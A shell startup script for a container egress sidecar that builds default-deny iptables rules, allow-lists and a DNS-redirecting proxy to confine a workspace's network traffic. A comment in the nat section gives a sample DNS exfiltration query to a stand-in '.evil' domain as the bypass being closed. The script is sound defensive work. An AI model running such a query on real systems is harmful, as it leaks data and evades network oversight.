#!/bin/sh
# Egress sidecar startup (#2253): install the OUTPUT ruleset + the nat REDIRECT,
# then run the FQDN DNS proxy. Runs in the sidecar (NET_ADMIN) which shares the
# workspace's network namespace.
#
# Loop-avoidance: the nat REDIRECT targets the workspace's configured resolvers
# (read from this sidecar's /etc/resolv.conf — the workspace inherits them via
# --network container:<sidecar>); the proxy forwards to a DIFFERENT upstream
# ($KLANGKNETWORK_EGRESS_UPSTREAM), which the REDIRECT must not match. Any nameserver
# equal to the upstream is skipped (would loop).
set -eu

UPSTREAM="${KLANGKNETWORK_EGRESS_UPSTREAM:-8.8.8.8}"
IPT="${KLANGKNETWORK_IPTABLES:-iptables}"
IPT6="${KLANGKNETWORK_IP6TABLES:-ip6tables}"
LISTEN_PORT="${KLANGKNETWORK_EGRESS_LISTEN_PORT:-15353}"
# fwmark the proxy stamps on its upstream socket (#2264). Must match proxy.py's
# KLANGKNETWORK_EGRESS_MARK. The mark scopes upstream:53 access to the proxy: the
# workspace lacks CAP_NET_RAW/NET_ADMIN and cannot mark, so its :53 traffic is
# REDIRECTed to the proxy (allow-listed) rather than reaching the upstream.
MARK="${KLANGKNETWORK_EGRESS_MARK:-75}"

# --- filter OUTPUT: default-deny + the paths the workspace + proxy need ---
$IPT -P OUTPUT DROP
# IPv6 default-deny (#1936): every host publishes a AAAA; without this an
# IPv6 path bypasses the v4 allow-list. ip6tables ships in the same alpine
# iptables package. The sidecar owns the netns (shared with the workspace
# via --network container:), so this is the authoritative v6 deny (#2255).
$IPT6 -P OUTPUT DROP
# Loopback by *destination* (not -o lo): REDIRECT keeps the packet's original
# output interface, so -o lo misses the redirected :53 packet under a DROP policy.
$IPT -A OUTPUT -d 127.0.0.0/8 -j ACCEPT
$IPT -A OUTPUT -o lo -j ACCEPT
$IPT -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
# Only the proxy (marked packets) may reach the upstream resolver directly.
# Unmarked :53 from the workspace is REDIRECTed to the proxy below (#2264).
$IPT -A OUTPUT -d "$UPSTREAM" -p udp --dport 53 -m mark --mark "$MARK" -j ACCEPT
$IPT -A OUTPUT -d "$UPSTREAM" -p tcp --dport 53 -m mark --mark "$MARK" -j ACCEPT

# --- static CIDR allow-specs (host specs are learned dynamically by the proxy).
# A "host:port" CIDR like 10.0.0.0/8:443 is stripped to its CIDR; per-domain
# port scoping is #2256.
IFS=','
for spec in ${KLANGKNETWORK_EGRESS_ALLOW:-}; do
  case "$spec" in
  */*)
    cidr=${spec%%:*}
    $IPT -A OUTPUT -d "$cidr" -j ACCEPT
    ;;
  esac
done
unset IFS

# --- backend reachability: allow the klangkd backend (LLM proxy + bridge)
# on host.containers.internal. The workspace must reach it to function, and
# host.containers.internal is a /etc/hosts entry (not a DNS lookup), so the
# FQDN proxy can never learn its IP — allow it statically, scoped to the
# backend port only (the klangkd backend is itself authenticated). #2254 B1.
case "${KLANGKNETWORK_EGRESS_BACKEND_PORT:-}" in
'' | *[!0-9]*) ;; # empty or non-numeric (e.g. "socket"): nothing to allow
*)
  gw=$(getent hosts host.containers.internal 2>/dev/null | awk '{print $1; exit}')
  [ -n "$gw" ] && $IPT -A OUTPUT -d "$gw" -p tcp --dport "$KLANGKNETWORK_EGRESS_BACKEND_PORT" -j ACCEPT
  ;;
esac

# --- interactive egress consent (#2239): in interactive mode, observe blocked
# destinations via NFLOG so the consent daemon (netlink group) can prompt a
# human. Rate-limited to cap flooding from adversarial containers; the DROP
# policy still fires for every packet. Placed AFTER every ACCEPT so only
# genuinely-blocked traffic is logged. In static mode (the default) no NFLOG
# rule is added — the DROP policy alone carries the deny, and the ruleset is
# fully immutable. The tag correlates a blocked packet with its workspace
# (passed from klangkd as the workspace-id prefix).
if [ "${KLANGKNETWORK_EGRESS_MODE:-}" = "interactive" ]; then
  _tag="${KLANGKNETWORK_EGRESS_TAG:-unknown}"
  $IPT -A OUTPUT -m limit --limit 5/sec --limit-burst 20 \
    -j NFLOG --nflog-group "${KLANGKNETWORK_EGRESS_NFLOG_GROUP:-5139}" \
    --nflog-prefix "klangk-egress:${_tag}:"
  $IPT -A OUTPUT -j DROP
fi

# --- nat OUTPUT: REDIRECT ALL :53 to the proxy, EXCEPT the proxy's own marked
# forwards (loop-avoidance). Redirecting every resolver — not just the
# configured one — closes the direct-to-upstream exfil bypass: a workspace
# `dig @<upstream> <data>.evil` is redirected here and allow-listed (#2264).
$IPT -t nat -A OUTPUT -p udp --dport 53 -m mark --mark "$MARK" -j RETURN
$IPT -t nat -A OUTPUT -p tcp --dport 53 -m mark --mark "$MARK" -j RETURN
$IPT -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports "$LISTEN_PORT"
$IPT -t nat -A OUTPUT -p tcp --dport 53 -j REDIRECT --to-ports "$LISTEN_PORT"

exec python3 /proxy.py
